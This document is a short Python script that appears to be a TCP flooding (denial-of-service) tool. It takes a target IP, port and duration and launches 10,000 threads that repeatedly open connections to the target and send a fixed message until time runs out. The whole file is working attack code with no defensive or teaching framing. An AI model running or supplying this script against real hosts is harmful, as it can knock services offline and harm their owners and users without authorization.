import socket
import sys
import threading
import random
import time

if len(sys.argv) <= 3:
    print("Usage: python " + sys.argv[0] + " <target ip> <duration> <port>")
    sys.exit()

target_ip = sys.argv[1]
duration = int(sys.argv[2])
target_port = int(sys.argv[3])
num_threads = 10000  # Adjust the number of threads as needed

def send_tcp_packet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(b'Hello, Server')
        s.close()
    except Exception as e:
        print(f"Connection error: {e}")

def run(stop_time):
    while time.time() < stop_time:
        send_tcp_packet()
        print('.', end='', flush=True)
        time.sleep(random.uniform(0.1, 1))  # Adjust the sleep time as needed

stop_time = time.time() + duration

threads = []
for i in range(num_threads):
    t = threading.Thread(target=run, args=(stop_time,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("\nFlooding finished.")
